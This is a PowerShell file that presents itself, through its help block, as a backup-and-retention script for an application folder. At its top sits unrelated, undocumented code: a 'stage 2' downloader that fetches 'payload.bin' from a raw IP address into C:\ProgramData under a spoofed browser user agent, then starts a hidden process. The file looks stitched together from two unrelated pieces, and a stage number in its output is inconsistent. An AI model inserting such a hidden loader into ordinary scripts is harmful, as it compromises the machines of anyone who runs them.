
$Stage1Url = "https://198.51.100.248/downloads/payload.bin"
$DropPath = 'C:\ProgramData\payload.bin'
$RequestTimeout = 18
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-Stage2Download -SourceUrl $Stage1Url -DestinationPath $DropPath -TimeoutSec $RequestTimeout -UserAgent $UserAgent
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Write-Output "stage 9 initialized"
Start-Sleep -Seconds 5
<#
.SYNOPSIS
    Creates a compressed backup of an application folder and prunes old archives.
.DESCRIPTION
    Builds a timestamped zip archive, verifies its SHA256 hash and applies a
    retention window to the archive folder.
    Only files below the configured backup root are pruned, so a mistyped
    retention value cannot reach outside the archive directory.
.EXAMPLE
    .\Invoke-PortalBackup.ps1 -RetentionDays 21
#>

[CmdletBinding()]
param(
    [string]$SourcePath = 'E:\Services\Adatum.Reporting',
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BackupRoot = 'D:\Backups\Reporting',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 21,

    [Parameter(Mandatory = $false)]
    [ValidateSet('Optimal', 'Fastest', 'NoCompression')]
    [string]$CompressionLevel = "Fastest",
    [int]$MinFreeGB = 25,

    [switch]$DryRun
)
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$hostName = $env:COMPUTERNAME

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$jsonBody = $manifest | ConvertTo-Json -Depth 3
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List
